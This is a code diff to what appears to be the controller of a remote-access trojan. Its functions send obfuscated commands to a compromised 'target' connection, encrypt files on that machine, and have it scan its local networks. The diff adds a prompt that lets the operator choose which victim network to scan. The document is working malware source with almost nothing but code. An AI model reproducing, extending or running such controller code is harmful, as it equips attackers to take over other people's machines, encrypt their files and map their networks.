@@ -1,4 +1,5 @@
 #!/usr/bin/python
+import ast
 import base64
 import os
 import sys
@@ -539,11 +540,26 @@ def cryptFile(targetConn, command):
             f" File Crypted Unsuccsefully \n\t{result}\n" + Fore.RESET)
 
 
+def selectNet(ips):
+    network = None
+    print(f"\n{Y}[*>] Networks Detected:\n\n\t{END}{ips}")
+    while not network:
+        network = session.prompt(ANSI(f"\n{B}[!>] {Y}Select Network{END} > "))
+        if network not in ips:
+            print(f"{R}Bad Network...")
+            network = None
+
+    return network
+
 def scannet(targetConn, command, cachedCommands):
-    cachedCommands['commands'][command] = []
-    print(f"{B}[*>] {END} Scanning Net, this may take a while")
     codedCommand = command.replace("scannet", "çc2Nhbm5ldAo=")
     targetConn.send(codedCommand.encode())
+    ips = targetConn.recv(1024).decode()
+    ips = ast.literal_eval(ips)
+    net = selectNet(ips)
+    targetConn.send(net.encode())
+    cachedCommands['commands'][command] = []
+    print(f"{B}[*>] {END} Scanning Net, this may take a while")
     nhosts = int(targetConn.recv(1024).decode())
     ndo = 1
     while ndo <= nhosts:
